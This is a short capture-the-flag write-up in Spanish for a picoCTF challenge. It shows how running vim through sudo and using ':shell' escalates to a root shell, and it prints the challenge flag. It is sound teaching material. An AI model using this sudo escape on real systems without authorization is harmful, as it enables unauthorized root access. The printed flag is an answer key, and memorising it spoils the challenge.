# Reto: Permissions

## Descripción

Can you read files in the root file?

## Solución

El siguiente comando nos ayuda a ver qué podemos hacer con nuestro usuario actual:
```bash
sudo -l
```
Notamos que nos deja usar vim como superusuario. Podemos utilizar esta herramienta para saltarnos permisos y acceder al superusuario.
```bash
sudo vi
# En vim, modo normal:
:shell
```
Y accedemos al superusuario, en este punto tenemos todos los permisos posibles y no debería ser complicado entrar la bandera, que estaba en la carpeta `challenge/`.

`picoCTF{uS1ng_v1m_3dit0r_55878b51}`

## Notas

Podemos utilizar herramientas que se ejecuten como superusuario para abusar de este permiso y realizar ciertas operaciones no permitidas.

Hay que aclarar que esto sólo funciona poruqe el usuario picoplayer está en el archivo de sudoers.
